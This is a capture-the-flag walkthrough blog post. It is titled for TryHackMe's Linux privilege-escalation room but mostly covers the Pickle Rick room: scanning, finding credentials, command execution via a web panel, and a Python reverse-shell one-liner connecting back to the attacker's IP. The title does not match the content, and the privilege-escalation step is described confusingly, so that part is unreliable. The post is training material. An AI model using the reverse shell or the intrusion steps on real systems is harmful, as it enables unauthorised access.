---
title: TryHackMe - Common Linux Privesc
subtitle: lorem-ipsum
date: '2021-10-27'
thumb_img_alt: lorem-ipsum
content_img_alt: Icelandic horses
excerpt: Follow along with this "Easy" rated box on TryHackMe to save Pickle Rick.
seo:
  title: Pickle Rick Walkthrough - Easy
  description: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
  extra:
    - name: 'og:type'
      value: article
      keyName: property
    - name: 'og:title'
      value: Pickle Rick CTF Walkthrough - Easy
      keyName: property
    - name: 'og:description'
      value: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
      keyName: property
    - name: 'og:image'
      value: /images/o9pyhyU.jpg
      keyName: property
      relativeUrl: true
    - name: 'twitter:card'
      value: summary_large_image
    - name: 'twitter:title'
      value: Pickle Rick CTF Walkthrough - Easy
    - name: 'twitter:description'
      value: Easy To Follow Walkthrough of TryHackMe's Pickle Rick CTF
    - name: 'twitter:image'
      value: /images/o9pyhyU.jpg
      relativeUrl: true
layout: post
thumb_img_path: /images/o9pyhyU.jpg
content_img_path: /images/banner.png
---
TryHackMe - Common Linux Privesc (Privilege Escalation): <https://tryhackme.com/room/commonlinuxprivesc>

This box is listed as Easy .  It provides walk-throughs and practice of common linux privilege escalation vectors.   

# TASKS 1 - 3 | What is Privesc?

Let's start by discussing what "privesc" is.  Essentially, privesc (privilege escalation) is leveraging access to a low pricilege account to move to a higer privilege account (eg user to root).  Privesc can occur in two directions: horizontal and vertical.  In horizontal privesc, access is gained to an account of the same privilege level. This can be beneficial to access private files or if the new user has SUIDs we can exploit.  In vertical privesc, access is gained to an account with more access to the system (admin / root).  Read through the provided information in each of the three tasks and complete each section.

# TASK 4 | ENUMERATION

## LinEnum

LinEnum is a bash script which performs common commands related to privesc.  It can be downloaded from:

<https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh>

Two ways to get LinEnum onto the target machine:

First - start a python webserver from the directory with your copy of LinEnum.sh. (python3 -m http.server 8000).  Then, wget the file from the target machine (wget \[LOCAL_IP]:8000/LinEnum.sh).  After it has been transfered to the target machine, make the file executable (chmod +x LinEnum.sh).

Second - Provided you have the required permissions, copy the raw code and create a .sh file in vi/nano/etc and paste the code.  Make the file executable.


![](/images/ping.png)

Everything looks good, so let's try to see which ports we have available.  I'll be using NMAP to perform this scan:

    sudo nmap -sN -Pn 10.10.19.153
         -sN -- TCP Null scan
         -Pn -- Treats all hosts as online / skip host discovery

![](/images/nmap.png)

We can see we have port 22 and port 80 open.  Let's curl the IP and see what we get back.

![](/images/a_curl_port\_80.png)

Nothing really stands out at first.  We can see we have a /assets/ directory we may be able to use later.  If we scroll down, however, we see a comment left by Rick, which gives us the Username.  We'll note this username, and be on the lookout for a login page.

Alternatively, we can navigate to \[TARGET_IP]:80, and inspect source there to get the same:

![](/images/a_inspect_source.png)

Before we jump to directory hunting, let's check for a robots.txt to get any more intel:

![](/images/a_curl_robots.png)

Curl returns a seemingly nonsense phrase that will be important later, and I have purposely blurred.  For now, we do not know its significance though.

Let's do some directory busting.  I'll be using DirBuster, and I'll be using a small wordlist that comes pre-installed in Parrot and Kali.  I'll input the target IP, as well as the file path to my list:

![](/images/dirbuster.png)

After letting the scan run for a few moments, we have some interesting results:

![](/images/a_dirbuster_return.png)

We can see both a /login.php and  a /portal.php which are interesting.  Let's navigate to the login page.

# FOOTHOLD

![](/images/login.png)

We know the Username from our notes of the HTML comment on the home page, but we don't know the password.  A quick trial of usual passwords doesn't work.  We can try a sniper attack in BurpSuite, but what about the text in /robots.txt?  Let's try that.

![](/images/command.png)

Awesome, that worked, and now we're in.  Let's check the page source for any hidden comments or bread crumbs:

![](/images/a_portal_source.png)

Nothing seems to stand out aside from the comment which appears to be Base64 encoded.  Let's make note of that and go back to /portal.php.  Let's try out a few commands we know, and see if that gets us anywhere.

![](/images/whoami.png)![](/images/ls.png)

After some trial and error, we can see that we're seemingly giving commands to a Linux machine.  We can see a 'clue.txt' and 'Sup3rS3cretPickl3Ingred.txt' in our current directory, so let's try to cat the ingredient.

![](/images/cat.png)

Ok.  That didn't work, but we have more options.  Let's wget the files and have them locally if we need them later.![](/images/wget.png)

From here, we can cat the files and see what they contain:

![](/images/a_first_ingred.png)

Awesome, we have the first ingredient as well as a hint for how to find the rest.

Alternatively, we would have been able to 'less' the .txt files and gotten their contents in the browser:

![](/images/a_less_first.png)![](/images/less_clue.png)

# REVERSE SHELL

At this point, we can continue to issue commands to the web browser panel.  However, for practice and ease of use, I chose to implement a reverse shell.  I started netcat on my machine, and listened on port 4444 (an arbitrary port).  I then issued the command

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'`

on the control panel, and was able to spawn the reverse shell:

![](/images/a_shell_open.png)

Now we can explore the machine and look for our next ingredient:

![](/images/a_shell_second.png)

# PRIVILEGE ESCALATION

Awesome.  That's the second ingredient, and we only have one left.  Unfortunately, the last one needs root access, so let's practice our privilege escalation.  I'll use another python script to sudo bash:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Now we can cd to /root, and get into the third ingredient:

![](/images/a_shell_last.png)

That's it! We got all three ingredients.  Enter them for your points, and I'll see you in the next room.
